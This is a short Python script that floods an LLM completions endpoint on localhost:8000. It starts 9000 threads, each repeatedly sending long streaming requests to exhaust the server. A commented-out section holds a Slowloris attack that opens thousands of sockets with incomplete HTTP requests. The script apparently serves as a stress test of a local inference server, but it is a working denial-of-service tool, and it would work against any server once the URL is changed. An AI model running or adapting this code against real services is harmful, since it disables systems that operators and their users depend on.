import socket
import multiprocessing
import resource

import requests
import threading

def flood():
    # Use tokens that don't compress well
    prompt = "     " * 400  # ~4000 tokens, harder to compress
    while True:
        try:
            requests.post("http://localhost:8000/v1/completions",
                json={
                    "model": "Qwen/Qwen2.5-0.5B-Instruct",
                    "prompt": prompt,
                    "max_tokens": 4096,
                    "stream": True  # Keep connection open longer
                },
                timeout=300)
        except Exception as e:
            print(f"Exception occurred: {e}")

# Launch many threads
threads = [threading.Thread(target=flood) for _ in range(9000)]
for t in threads:
    print(f"Starting thread {t.name}")
    t.start()

# import socket

# sockets = []
# for i in range(8000):
#     try:
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         s.connect(('localhost', 8000))
#         # Send partial HTTP request, never complete it (Slowloris attack)
#         s.send(b'POST /v1/completions HTTP/1.1\r\nHost: localhost\r\n')
#         sockets.append(s)
#     except Exception as e:
#         print(f"Opened {i} connections: {e}")
#         break